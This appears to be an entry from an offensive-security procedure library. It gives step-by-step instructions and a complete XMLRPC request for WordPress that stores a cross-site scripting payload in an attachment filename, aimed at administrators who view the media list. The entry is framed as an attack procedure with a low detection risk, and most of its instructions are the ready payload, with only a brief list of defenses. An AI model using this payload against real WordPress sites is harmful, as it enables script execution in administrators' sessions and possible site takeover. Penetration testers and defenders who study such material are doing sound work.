---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - xss
  - xmlrpc
  - payload-prep
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.945Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-XMLRPC-Payload-for-Malicious-Attachment

## Summary

This procedure creates an XML file for the WordPress XMLRPC wp.newPost() method, configuring it as an attachment with a filename containing a stored XSS payload to exploit unescaped output in the media list.

## Description

In the context of WordPress stored XSS via attachment filenames, this step prepares the payload by crafting an XMLRPC request that uses wp.newPost() to create a post of type 'attachment'. The filename parameter includes a malicious string like 'ccc'><img src=x onerror=alert('xss') onload=alert('xss')>' which breaks out of HTML context when echoed without escaping in wp-admin/includes/class-wp-media-list-table.php. This targets authenticated users who can call XMLRPC, leading to storage of the payload for later execution by admins.

## Requirements

1. Text editor or script to generate XML
2. Knowledge of WordPress XMLRPC API (wp.newPost method)
3. Valid authentication details for XMLRPC (username/password in separate auth step, not in payload)

## Defense

Defensive measures and detection strategies:

- Disable XMLRPC if not needed (via plugins like Disable XML-RPC)
- Enforce strict file naming sanitization on upload
- Monitor XMLRPC logs for unusual wp.newPost calls with attachment type

## Objectives

1. Generate a valid XMLRPC payload for attachment creation
2. Embed XSS payload in filename to exploit output in media views
3. Ensure payload survives storage in get_attached_file()

## Instructions

### Step 1: Create XML File

**Context**: Manually or via script, write the XML structure for wp.newPost, setting post_type to 'attachment' and injecting XSS in the file parameter.

**Command** (Manual file creation):
No command; create xss.xml with content:
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.newPost</methodName>
  <params>
    <param><value><string>1</string></value></param> <!-- blog_id -->
    <param><value><string>your_username</string></value></param>
    <param><value><string>your_password</string></value></param>
    <param><value><struct>
      <member><name>post_type</name><value><string>attachment</string></value></member>
      <member><name>post_title</name><value><string>aaa</string></value></member>
      <member><name>post_content</name><value><string>bbb</string></value></member>
      <member><name>post_status</name><value><string>publish</string></value></member>
      <member><name>file</name><value><string>ccc'><img src=x onerror=alert('xss') onload=alert('xss')></string></value></member>
    </struct></value></param>
  </params>
</methodCall>
```

> This XML authenticates and creates the attachment. Replace username/password. The file parameter's value is the malicious filename. Expected: Valid XML file of ~500 bytes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- xmlrpc
- wordpress
